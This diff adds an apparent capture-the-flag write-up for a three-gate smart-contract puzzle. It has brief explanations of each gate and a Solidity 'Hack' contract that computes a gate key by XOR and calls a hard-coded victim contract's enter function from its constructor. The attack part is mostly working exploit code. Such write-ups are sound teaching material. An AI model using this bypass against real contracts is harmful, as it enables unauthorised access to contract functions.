@@ -1,0 +1,29 @@
+Solution
+
+This challenge have 3 probleas to resolve:
+
+gate 1: This is easy. To pass this gate we have to use a contract. msg.sender come from contract and and tx.origin from the wallet.
+
+gate 2: To pass this gate we have call the contract from the constructor of the atack contract
+
+gate 3: To pass this gate I create the following script
+
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.10;
+
+interface Victim {
+  function enter(bytes8 _gateKey) external returns (bool);
+}
+
+contract Hack {    
+
+    bool public result; 
+
+    constructor() {
+      uint64 firstValue = 18446744073709551615;
+      uint64 secondValue = uint64(bytes8(keccak256(abi.encodePacked(address(this)))));
+      address victim = 0xeDF16E4c3838fd2300944E8019222EB0Ca24A9Be;
+      uint64 clave = firstValue ^ secondValue;
+      victim.call(abi.encodeWithSignature("enter(bytes8)", bytes8(clave)));
+    }
+}
